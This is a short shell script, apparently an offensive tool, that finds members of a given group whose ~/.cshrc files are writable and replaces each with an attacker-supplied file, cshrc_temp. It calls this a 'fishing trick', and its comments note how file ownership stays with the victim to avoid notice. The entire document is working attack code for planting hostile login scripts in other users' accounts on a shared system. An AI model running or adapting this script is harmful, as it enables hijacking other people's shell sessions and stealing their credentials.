#!/usr/bin/sh
#
# Validate .cshrc's permission for all members of a group specified on the command line
# and apply your fishing trick. :-) :-)
#

PATH=/usr/bin

if [ $# != 1 ]; then
    echo "Usage: $0 <grp-name>"
    exit 1
fi

wantedgroup=$1
#echo $wantedgroup

groupid=`getent group | awk -F: '{ if($1=="'$wantedgroup'") print $3}'`
#echo $groupid

users=`getent passwd | awk -F: '{ if($4=="'$groupid'") print $1 }'`
#echo $users

for wusr in $users
do
    if [ -w /home/$wusr/.cshrc ]; then
        echo "/home/$wusr/.cshrc is writable. Proceed[Y/N]?:\c"
        read cflag
        if [ X"$cflag" = "XY" ]; then
            cp /home/$wusr/.cshrc .cshrc.hk.$wusr
            if [ $? -ne 0 ] ; then 
                echo "Operation failed on /home/$wusr/.cshrc"
                exit 1
            fi
            echo "cp /home/$wusr/.cshrc .cshrc.hk.$wusr -> DONE"

            # Hk file will have my permissions
            # But .cshrc file will have $wusr permission
            cp cshrc_temp /home/$wusr/.cshrc
            if [ $? -ne 0 ] ; then
                echo "Operation failed on /home/$wusr/.cshrc" 
                exit 1
            fi
            echo "cp cshrc_temp /home/$wusr/.cshrc -> DONE"
                
            # Again , cp in cshrc_temp.sh will keep .cshrc with $wusr permissions
            # rm will remove Hk file havin my perms'
        fi
    fi
done
